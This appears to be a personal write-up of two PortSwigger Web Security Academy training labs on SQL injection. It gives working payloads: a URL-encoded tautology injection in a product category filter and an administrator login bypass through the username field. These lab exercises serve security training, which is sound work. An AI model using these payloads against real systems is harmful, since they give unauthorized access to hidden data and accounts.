---
title: SQLi - APPRENTICE
tags: [Web, Portswigger Web Security Academy]

category: "Security/Practice/Portswigger Web Security Academy/SQL"
---

# SQLi - APPRENTICE
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
[TOC]

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
* Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

## Exp
Payload: `https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20#`
:::spoiler Success Screenshot
![](https://i.imgur.com/pPKFYKj.png)
:::


---

## Lab: SQL injection vulnerability allowing login bypass
* Hint:  This lab contains a SQL injection vulnerability in the login function.
To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 

## Exp
Payload:
Username: `administrator' or '1'='1' -- #`
Password: Arbitrary
:::spoiler Success Screenshot
![](https://i.imgur.com/dBm7zzB.png)
:::


## Reference
[Burp Suite Security Academy Writeup](https://github.com/frank-leitner/portswigger-websecurity-academy)